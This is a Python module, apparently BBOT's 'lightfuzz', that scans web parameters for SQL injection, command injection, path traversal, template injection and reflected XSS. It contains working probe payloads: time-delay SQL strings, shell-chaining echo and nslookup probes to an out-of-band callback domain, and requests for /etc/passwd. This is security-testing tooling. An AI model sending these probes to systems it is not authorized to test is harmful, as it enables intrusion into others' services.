from bbot.modules.base import BaseModule
import statistics
import re
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs, urlunparse
from bbot.core.helpers.misc import extract_params_html, extract_params_location
from bbot.errors import InteractshError, HttpCompareError


class BaseLightfuzz:
    def __init__(self, lightfuzz, event):
        self.lightfuzz = lightfuzz
        self.event = event
        self.results = []

    async def send_probe(self, probe):
        getparams = {self.event.data["name"]: probe}
        url = self.lightfuzz.helpers.add_get_params(self.event.data["url"], getparams).geturl()
        self.lightfuzz.debug(f"lightfuzz sending probe with URL: {url}")
        r = await self.lightfuzz.helpers.request(method="GET", url=url, allow_redirects=False, retries=2, timeout=10)
        if r:
            return r.text

    def compare_baseline(self, event_type, probe, cookies):

        if event_type == "GETPARAM":
            baseline_url = f"{self.event.data['url']}?{self.event.data['name']}={probe}"
            http_compare = self.lightfuzz.helpers.http_compare(
                baseline_url, cookies=cookies, include_cache_buster=False
            )
        elif event_type == "COOKIE":
            cookies_probe = {self.event.data["name"]: f"{probe}"}
            http_compare = self.lightfuzz.helpers.http_compare(
                self.event.data["url"], include_cache_buster=False, cookies={**cookies, **cookies_probe}
            )
        elif event_type == "HEADER":
            headers = {self.event.data["name"]: f"{probe}"}
            http_compare = self.lightfuzz.helpers.http_compare(
                self.event.data["url"], include_cache_buster=False, headers=headers, cookies=cookies
            )
        elif event_type == "POSTPARAM":
            data = {self.event.data["name"]: f"{probe}"}
            if self.event.data["additional_params"] is not None:
                data.update(self.event.data["additional_params"])
            http_compare = self.lightfuzz.helpers.http_compare(
                self.event.data["url"], method="POST", include_cache_buster=False, data=data, cookies=cookies
            )
        return http_compare

    async def compare_probe(self, http_compare, event_type, probe, cookies):

        if event_type == "GETPARAM":
            probe_url = f"{self.event.data['url']}?{self.event.data['name']}={probe}"
            compare_result = await http_compare.compare(probe_url, cookies=cookies)
        elif event_type == "COOKIE":
            cookies_probe = {self.event.data["name"]: probe}
            compare_result = await http_compare.compare(self.event.data["url"], cookies={**cookies, **cookies_probe})
        elif event_type == "HEADER":
            headers = {self.event.data["name"]: f"{probe}"}
            compare_result = await http_compare.compare(self.event.data["url"], headers=headers, cookies=cookies)
        elif event_type == "POSTPARAM":
            data = {self.event.data["name"]: f"{probe}"}
            if self.event.data["additional_params"] is not None:
                data.update(self.event.data["additional_params"])
            compare_result = await http_compare.compare(
                self.event.data["url"], method="POST", data=data, cookies=cookies
            )
        return compare_result

    async def standard_probe(self, event_type, cookies, probe_value, timeout=10):

        method = "GET"
        if event_type == "GETPARAM":
            url = f"{self.event.data['url']}?{self.event.data['name']}={probe_value}"
        else:
            url = self.event.data["url"]
        if event_type == "COOKIE":
            cookies_probe = {self.event.data["name"]: probe_value}
            cookies = {**cookies, **cookies_probe}
        if event_type == "HEADER":
            headers = {self.event.data["name"]: probe_value}
        else:
            headers = {}
        if event_type == "POSTPARAM":
            method = "POST"
            data = {self.event.data["name"]: probe_value}
            if self.event.data["additional_params"] is not None:
                data.update(self.event.data["additional_params"])
        else:
            data = {}
        self.lightfuzz.debug(f"standard_probe requested URL: [{url}]")
        return await self.lightfuzz.helpers.request(
            method=method,
            cookies=cookies,
            headers=headers,
            data=data,
            url=url,
            allow_redirects=False,
            retries=0,
            timeout=timeout,
        )


class SSTILightfuzz(BaseLightfuzz):
    async def fuzz(self):
        cookies = self.event.data.get("assigned_cookies", {})
        probe_value = "<%25%3d%201337*1337%20%25>"
        r = await self.standard_probe(self.event.data["type"], cookies, probe_value)
        if r and "1787569" in r.text:
            self.results.append(
                {
                    "type": "FINDING",
                    "description": f"POSSIBLE Server-side Template Injection. Parameter: [{self.event.data['name']}] Parameter Type: [{self.event.data['type']}] Detection Method: [Integer Multiplication]",
                }
            )


class PathTraversalLightfuzz(BaseLightfuzz):

    async def fuzz(self):
        cookies = self.event.data.get("assigned_cookies", {})
        if "original_value" in self.event.data and self.event.data["original_value"] is not None:
            probe_value = self.event.data["original_value"]
        else:
            probe_value = self.lightfuzz.helpers.rand_string(8, numeric_only=True)

        http_compare = self.compare_baseline(self.event.data["type"], probe_value, cookies)

        # Single dot traversal tolerance test

        path_techniques = {
            "single-dot traversal tolerance (no-encoding)": {
                "singledot_payload": f"/./{probe_value}",
                "doubledot_payload": f"/../{probe_value}",
            },
            "single-dot traversal tolerance (url-encoding)": {
                "singledot_payload": urllib.parse.quote(f"/./{probe_value}".encode(), safe=""),
                "doubledot_payload": urllib.parse.quote(f"/../{probe_value}".encode(), safe=""),
            },
        }

        for path_technique, payloads in path_techniques.items():

            try:
                singledot_probe = await self.compare_probe(
                    http_compare, self.event.data["type"], payloads["singledot_payload"], cookies
                )
                doubledot_probe = await self.compare_probe(
                    http_compare, self.event.data["type"], payloads["doubledot_payload"], cookies
                )

                if (
                    singledot_probe[0] == True
                    and doubledot_probe[0] == False
                    and doubledot_probe[3] != None
                    and doubledot_probe[3].status_code != 403
                    and doubledot_probe[1] != ["header"]
                ):
                    self.results.append(
                        {
                            "type": "FINDING",
                            "description": f"POSSIBLE Path Traversal. Parameter: [{self.event.data['name']}] Parameter Type: [{self.event.data['type']}] Detection Method: [{path_technique}]",
                        }
                    )
                    # no need to report both techniques if they both work
                    break
            except HttpCompareError as e:
                self.lightfuzz.debug(e)
                continue

        # Absolute path test

        absolute_paths = {r"c:\\windows\\win.ini": "; for 16-bit app support", "/etc/passwd": "daemon:x:"}

        for path, trigger in absolute_paths.items():
            r = await self.standard_probe(self.event.data["type"], cookies, path)
            if r and trigger in r.text:
                self.results.append(
                    {
                        "type": "FINDING",
                        "description": f"POSSIBLE Path Traversal. Parameter: [{self.event.data['name']}] Parameter Type: [{self.event.data['type']}] Detection Method: [Absolute Path: {path}]",
                    }
                )


class CmdILightFuzz(BaseLightfuzz):
    async def fuzz(self):

        cookies = self.event.data.get("assigned_cookies", {})
        if (
            "original_value" in self.event.data
            and self.event.data["original_value"] is not None
            and len(self.event.data["original_value"]) != 0
        ):
            probe_value = self.event.data["original_value"]
        else:
            probe_value = self.lightfuzz.helpers.rand_string(8, numeric_only=True)

        canary = self.lightfuzz.helpers.rand_string(8, numeric_only=True)
        http_compare = self.compare_baseline(self.event.data["type"], probe_value, cookies)

        cmdi_probe_strings = [
            ";",
            "&&",
            "||",
            "&",
            "|",
            "MMMM",
        ]

        positive_detections = []
        for p in cmdi_probe_strings:
            try:
                echo_probe = f"{probe_value}{p} echo {canary} {p}"
                if self.event.data["type"] == "GETPARAM":
                    echo_probe = urllib.parse.quote(echo_probe.encode(), safe="")
                cmdi_probe = await self.compare_probe(http_compare, self.event.data["type"], echo_probe, cookies)
                if cmdi_probe[3]:
                    if canary in cmdi_probe[3].text and "echo" not in cmdi_probe[3].text:
                        self.lightfuzz.debug(f"canary [{canary}] found in response when sending probe [{p}]")
                        positive_detections.append(p)
            except HttpCompareError as e:
                self.lightfuzz.debug(e)
                continue

        if len(positive_detections) > 0:
            self.results.append(
                {
                    "type": "FINDING",
                    "description": f"POSSIBLE OS Command Injection. Parameter: [{self.event.data['name']}] Parameter Type: [{self.event.data['type']}] Detection Method: [echo canary] CMD Probe Delimeters: [{' '.join(positive_detections)}]",
                }
            )

        # Blind OS Command Injection
        if self.lightfuzz.interactsh_instance:
            self.lightfuzz.event_dict[self.event.data["url"]] = self.event

            for p in cmdi_probe_strings:

                subdomain_tag = self.lightfuzz.helpers.rand_string(4, digits=False)
                self.lightfuzz.interactsh_subdomain_tags[subdomain_tag] = {
                    "event": self.event,
                    "type": self.event.data["type"],
                    "name": self.event.data["name"],
                    "probe": p,
                }
                interactsh_probe = f"{p} nslookup {subdomain_tag}.{self.lightfuzz.interactsh_domain} {p}"

                if self.event.data["type"] == "GETPARAM":
                    interactsh_probe = urllib.parse.quote(interactsh_probe.encode(), safe="")
                await self.standard_probe(
                    self.event.data["type"], cookies, f"{probe_value}{interactsh_probe}", timeout=15
                )


class SQLiLightfuzz(BaseLightfuzz):
    expected_delay = 5

    def evaluate_delay(self, mean_baseline, measured_delay):
        margin = 1
        if (
            mean_baseline + self.expected_delay - margin
            <= measured_delay
            <= mean_baseline + self.expected_delay + margin
        ):
            return True
        # check for exactly twice the delay, in case the statement gets placed in the query twice
        elif (
            mean_baseline + (self.expected_delay * 2) - margin
            <= measured_delay
            <= mean_baseline + (self.expected_delay * 2) + margin
        ):
            return True
        else:
            return False

    async def fuzz(self):

        cookies = self.event.data.get("assigned_cookies", {})
        if "original_value" in self.event.data and self.event.data["original_value"] is not None:
            probe_value = self.event.data["original_value"]
        else:
            probe_value = self.lightfuzz.helpers.rand_string(8, numeric_only=True)
        http_compare = self.compare_baseline(self.event.data["type"], probe_value, cookies)

        try:
            single_quote = await self.compare_probe(http_compare, self.event.data["type"], f"{probe_value}'", cookies)
            double_single_quote = await self.compare_probe(
                http_compare, self.event.data["type"], f"{probe_value}''", cookies
            )

            if "code" in single_quote[1] and "code" not in double_single_quote[1]:
                self.results.append(
                    {
                        "type": "FINDING",
                        "description": f"Possible SQL Injection. Parameter: [{self.event.data['name']}] Parameter Type: [{self.event.data['type']}] Detection Method: [Single Quote/Two Single Quote]",
                    }
                )
        except HttpCompareError as e:
            self.lightfuzz.debug(e)

        standard_probe_strings = [
            f"'||pg_sleep({str(self.expected_delay)})--",  # postgres
            f"1' AND (SLEEP({str(self.expected_delay)})) AND '",  # mysql
            f"' AND (SELECT FROM DBMS_LOCK.SLEEP({str(self.expected_delay)})) AND '1'='1"  # oracle (not tested)
            f"; WAITFOR DELAY '00:00:{str(self.expected_delay)}'--",  # mssql (not tested)
        ]
        method = "GET"

        baseline_1 = await self.standard_probe(self.event.data["type"], cookies, probe_value)
        baseline_2 = await self.standard_probe(self.event.data["type"], cookies, probe_value)

        if baseline_1 and baseline_2:
            baseline_1_delay = baseline_1.elapsed.total_seconds()
            baseline_2_delay = baseline_2.elapsed.total_seconds()
            mean_baseline = statistics.mean([baseline_1_delay, baseline_2_delay])

            for p in standard_probe_strings:
                confirmations = 0
                for i in range(0, 3):
                    r = await self.standard_probe(self.event.data["type"], cookies, f"{probe_value}{p}")
                    if not r:
                        self.lightfuzz.debug("delay measure request failed")
                        break

                    d = r.elapsed.total_seconds()
                    self.lightfuzz.debug(f"measured delay: {str(d)}")
                    if self.evaluate_delay(mean_baseline, d):
                        confirmations += 1
                        self.lightfuzz.debug(
                            f"{self.event.data['url']}:{self.event.data['name']}:{self.event.data['type']} Increasing confirmations, now: {str(confirmations)} "
                        )
                    else:
                        break

                if confirmations == 3:
                    self.results.append(
                        {
                            "type": "FINDING",
                            "description": f"Possible Blind SQL Injection. Parameter: [{self.event.data['name']}] Parameter Type: [{self.event.data['type']}] Detection Method: [Delay Probe ({p})]",
                        }
                    )

        else:
            self.lightfuzz.debug("Could not get baseline for time-delay tests")


class XSSLightfuzz(BaseLightfuzz):
    def determine_context(self, html, random_string):
        between_tags = False
        in_tag_attribute = False
        in_javascript = False

        between_tags_regex = re.compile(rf"<(\/?\w+)[^>]*>.*?{random_string}.*?<\/?\w+>")
        in_tag_attribute_regex = re.compile(rf'<(\w+)\s+[^>]*?(\w+)="([^"]*?{random_string}[^"]*?)"[^>]*>')
        in_javascript_regex = re.compile(
            rf"<script\b[^>]*>(?:(?!<\/script>)[\s\S])*?{random_string}(?:(?!<\/script>)[\s\S])*?<\/script>"
        )

        between_tags_match = re.search(between_tags_regex, html)
        if between_tags_match:
            between_tags = True

        in_tag_attribute_match = re.search(in_tag_attribute_regex, html)
        if in_tag_attribute_match:
            in_tag_attribute = True

        in_javascript_regex = re.search(in_javascript_regex, html)
        if in_javascript_regex:
            in_javascript = True

        return between_tags, in_tag_attribute, in_javascript

    async def check_probe(self, probe, match, context):
        probe_result = await self.send_probe(probe)
        if probe_result and match in probe_result:
            self.results.append(
                {
                    "type": "FINDING",
                    "description": f"Possible Reflected XSS. Parameter: [{self.event.data['name']}] Context: [{context}]",
                }
            )

    async def fuzz(self):
        lightfuzz_event = self.event.source

        # If this came from paramminer_getparams and didn't have a http_reflection tag, we don't need to check again
        if (
            lightfuzz_event.type == "WEB_PARAMETER"
            and lightfuzz_event.source.type == "paramminer_getparams"
            and "http_reflection" not in lightfuzz_event.tags
        ):
            return

        reflection = None
        random_string = self.lightfuzz.helpers.rand_string(8)
        reflection_probe_result = await self.send_probe(random_string)
        if reflection_probe_result and random_string in reflection_probe_result:
            reflection = True

        if not reflection or reflection == False:
            return

        between_tags, in_tag_attribute, in_javascript = self.determine_context(reflection_probe_result, random_string)

        self.lightfuzz.debug(
            f"determine_context returned: between_tags [{between_tags}], in_tag_attribute [{in_tag_attribute}], in_javascript [{in_javascript}]"
        )

        if between_tags:
            between_tags_probe = f"<z>{random_string}</z>"
            await self.check_probe(between_tags_probe, between_tags_probe, "Between Tags")

        if in_tag_attribute:
            in_tag_attribute_probe = f'{random_string}"'
            in_tag_attribute_match = f'"{random_string}""'
            await self.check_probe(in_tag_attribute_probe, in_tag_attribute_match, "Tag Attribute")

        if in_javascript:
            in_javascript_probe = rf"</script><script>{random_string}</script>"
            await self.check_probe(in_javascript_probe, in_javascript_probe, "In Javascript")


class lightfuzz(BaseModule):
    watched_events = ["URL", "HTTP_RESPONSE", "WEB_PARAMETER"]
    produced_events = ["FINDING", "VULNERABILITY"]
    flags = ["active", "web-thorough"]
    options = {
        "force_common_headers": False,
        "submodule_sqli": True,
        "submodule_xss": True,
        "submodule_cmdi": True,
        "submodule_path": True,
        "submodule_ssti": True,
        "retain_querystring": False,
    }
    options_desc = {
        "force_common_headers": "Force emit commonly exploitable parameters that may be difficult to detect",
        "submodule_sqli": "Enable the SQL Injection Submodule",
        "submodule_xss": "Enable the XSS Submodule",
        "submodule_cmdi": "Enable the Command Injection Submodule",
        "submodule_path": "Enable the Path Traversal Submodule",
        "submodule_ssti": "Enable the Server-side Template Injection Submodule",
        "retain_querystring": "Keep the querystring intact on emitted WEB_PARAMETERS",
    }
    meta = {"description": "Find Web Parameters and Lightly Fuzz them using a heuristic based scanner"}
    common_headers = ["x-forwarded-for", "user-agent"]
    parameter_blacklist = [
        "__VIEWSTATE",
        "__EVENTARGUMENT",
        "__EVENTVALIDATION",
        "__EVENTTARGET",
        "__EVENTARGUMENT",
        "__VIEWSTATEGENERATOR",
        "__SCROLLPOSITIONY",
        "__SCROLLPOSITIONX",
        "ASP.NET_SessionId",
        "JSESSIONID",
        "PHPSESSID",
    ]
    in_scope_only = True

    max_event_handlers = 2

    async def setup(self):
        self.event_dict = {}
        self.interactsh_subdomain_tags = {}
        self.interactsh_instance = None

        self.submodule_sqli = False
        self.submodule_cmdi = False
        self.submodule_xss = False
        self.submodule_path = False
        self.submodule_ssti = False

        if self.config.get("submodule_sqli", False) == True:
            self.submodule_sqli = True
            self.hugeinfo("Lightfuzz SQL Injection Submodule Enabled")

        if self.config.get("submodule_xss", False) == True:
            self.submodule_xss = True
            self.hugeinfo("Lightfuzz XSS Submodule Enabled")

        if self.config.get("submodule_ssti", False) == True:
            self.submodule_ssti = True
            self.hugeinfo("Lightfuzz SSTI Submodule Enabled")

        if self.config.get("submodule_cmdi", False) == True:
            self.submodule_cmdi = True
            self.hugeinfo("Lightfuzz Command Injection Submodule Enabled")

            if self.scan.config.get("interactsh_disable", False) == False:
                try:
                    self.interactsh_instance = self.helpers.interactsh()
                    self.interactsh_domain = await self.interactsh_instance.register(callback=self.interactsh_callback)
                except InteractshError as e:
                    self.warning(f"Interactsh failure: {e}")

        if self.config.get("submodule_path", False) == True:
            self.submodule_path = True
            self.hugeinfo("Lightfuzz Path Traversal Submodule Enabled")

        if (
            self.submodule_sqli == False
            and self.submodule_cmdi == False
            and self.submodule_xss == False
            and self.submodule_path == False
            and self.submodule_ssti == False
        ):
            self.hugeinfo("All lightfuzz submodules disabled, harvesting parameters only")

        self.retain_querystring = False
        if self.config.get("retain_querystring", False) == True:
            self.retain_querystring = True

        return True

    async def interactsh_callback(self, r):
        full_id = r.get("full-id", None)
        if full_id:
            if "." in full_id:
                details = self.interactsh_subdomain_tags.get(full_id.split(".")[0])
                if not details["event"]:
                    return
                await self.emit_event(
                    {
                        "severity": "CRITICAL",
                        "host": str(details["event"].host),
                        "url": details["event"].data["url"],
                        "description": f"OS Command Injection (OOB Interaction) Type: [{details['type']}] Parameter Name: [{details['name']}] Probe: [{details['probe']}]",
                    },
                    "VULNERABILITY",
                    details["event"],
                )
            else:
                # this is likely caused by something trying to resolve the base domain first and can be ignored
                self.debug("skipping result because subdomain tag was missing")

    def _outgoing_dedup_hash(self, event):
        return hash(
            (
                "lightfuzz",
                str(event.host),
                event.data["url"],
                event.data["description"],
                event.data.get("type", ""),
                event.data.get("name", ""),
            )
        )

    def in_bl(self, value):
        in_bl = False
        for bl_param in self.parameter_blacklist:
            if bl_param.lower() == value.lower():
                in_bl = True
        return in_bl

    def url_unparse(self, param_type, parsed_url):
        if param_type == "GETPARAM":
            querystring = ""
        else:
            querystring = parsed_url.query
        return urlunparse(
            (
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                "",
                querystring if self.retain_querystring else "",
                "",
            )
        )

    async def run_submodule(self, submodule, event):
        submodule_instance = submodule(self, event)
        await submodule_instance.fuzz()
        if len(submodule_instance.results) > 0:
            for r in submodule_instance.results:
                event_data = {"host": str(event.host), "url": event.data["url"], "description": r["description"]}
                if r["type"] == "VULNERABILITY":
                    event_data["severity"] = r["severity"]
                await self.emit_event(
                    event_data,
                    r["type"],
                    event,
                )

    async def handle_event(self, event):
        if event.type == "URL":
            if self.config.get("force_common_headers", False) == False:

                return False

            for h in self.common_headers:
                description = f"Speculative (Forced) Header [{h}]"
                data = {
                    "host": str(event.host),
                    "type": "HEADER",
                    "name": h,
                    "original_value": None,
                    "url": event.data,
                    "description": description,
                }
                await self.emit_event(data, "WEB_PARAMETER", event)

        if event.type == "HTTP_RESPONSE":
            assigned_cookies = {}
            headers = event.data.get("header", "")
            for k, v in headers.items():
                if k.lower() == "set_cookie":

                    if "=" not in v:
                        self.debug(f"Cookie found without '=': {v}")
                        continue
                    else:

                        cookie_name = v.split("=")[0]
                        cookie_value = v.split("=")[1].split(";")[0]

                        if self.in_bl(cookie_value) == False:
                            assigned_cookies[cookie_name] = cookie_value
                            description = f"Set-Cookie Assigned Cookie [{cookie_name}]"
                            data = {
                                "host": str(event.host),
                                "type": "COOKIE",
                                "name": cookie_name,
                                "original_value": cookie_value,
                                "url": self.url_unparse("COOKIE", event.parsed_url),
                                "description": description,
                            }
                            await self.emit_event(data, "WEB_PARAMETER", event)
                        else:
                            self.debug(f"blocked cookie parameter [{cookie_name}] due to BL match")
                if k.lower() == "location":
                    for (
                        method,
                        parsed_url,
                        parameter_name,
                        original_value,
                        regex_name,
                        additional_params,
                    ) in extract_params_location(v, event.parsed_url):
                        if self.in_bl(parameter_name) == False:
                            description = f"HTTP Extracted Parameter [{parameter_name}]"
                            data = {
                                "host": parsed_url.hostname,
                                "type": "GETPARAM",
                                "name": parameter_name,
                                "original_value": original_value,
                                "url": self.url_unparse("GETPARAM", parsed_url),
                                "description": description,
                                "additional_params": additional_params,
                            }
                            await self.emit_event(data, "WEB_PARAMETER", event)

            body = event.data.get("body", "")

            for method, endpoint, parameter_name, original_value, regex_name, additional_params in extract_params_html(
                body
            ):
                in_bl = False

                if endpoint == None or endpoint == "":
                    endpoint = event.data["url"]

                if endpoint.startswith("http://") or endpoint.startswith("https://"):
                    url = endpoint
                else:
                    url = f"{event.parsed_url.scheme}://{event.parsed_url.netloc}{endpoint}"

                self.debug(
                    f"extract_params_html returned: endpoint [{endpoint}], parameter_name [{parameter_name}], regex_name [{regex_name}]"
                )

                if method == None or method == "GET":
                    paramtype = "GETPARAM"
                elif method == "POST":
                    paramtype = "POSTPARAM"
                else:
                    self.warning(f"Invalid method received! ({method})")
                    continue

                if self.in_bl(parameter_name) == False:

                    parsed_url = urlparse(url)
                    description = f"HTTP Extracted Parameter [{parameter_name}]"
                    self.critical(self.retain_querystring)
                    self.hugeinfo(event.parsed_url)
                    data = {
                        "host": parsed_url.hostname,
                        "type": paramtype,
                        "name": parameter_name,
                        "original_value": original_value,
                        "url": self.url_unparse(paramtype, parsed_url),
                        "description": description,
                        "additional_params": additional_params,
                        "assigned_cookies": assigned_cookies,
                        "regex_name": regex_name,
                    }
                    await self.emit_event(data, "WEB_PARAMETER", event)
                else:
                    self.debug(f"blocked parameter [{parameter_name}] due to BL match")

        elif event.type == "WEB_PARAMETER":

            if self.submodule_xss:
                if event.data["type"] == "GETPARAM":
                    self.debug("STARTING XSS FUZZ")
                    await self.run_submodule(XSSLightfuzz, event)

            if self.submodule_sqli:
                self.debug("STARTING SQLI FUZZ")
                await self.run_submodule(SQLiLightfuzz, event)

            if self.submodule_cmdi:
                self.debug("Starting CMDI FUZZ")
                await self.run_submodule(CmdILightFuzz, event)

            if self.submodule_path:
                self.debug("Staring Path Traversal FUZZ")
                await self.run_submodule(PathTraversalLightfuzz, event)

            if self.submodule_ssti:
                self.debug("Staring Server-side Template Injection FUZZ")
                await self.run_submodule(SSTILightfuzz, event)

    async def cleanup(self):
        if self.interactsh_instance:
            try:
                await self.interactsh_instance.deregister()
                self.debug(
                    f"successfully deregistered interactsh session with correlation_id {self.interactsh_instance.correlation_id}"
                )
            except InteractshError as e:
                self.warning(f"Interactsh failure: {e}")

    async def finish(self):
        if self.interactsh_instance:
            await self.helpers.sleep(5)
            try:
                for r in await self.interactsh_instance.poll():
                    await self.interactsh_callback(r)
            except InteractshError as e:
                self.debug(f"Error in interact.sh: {e}")
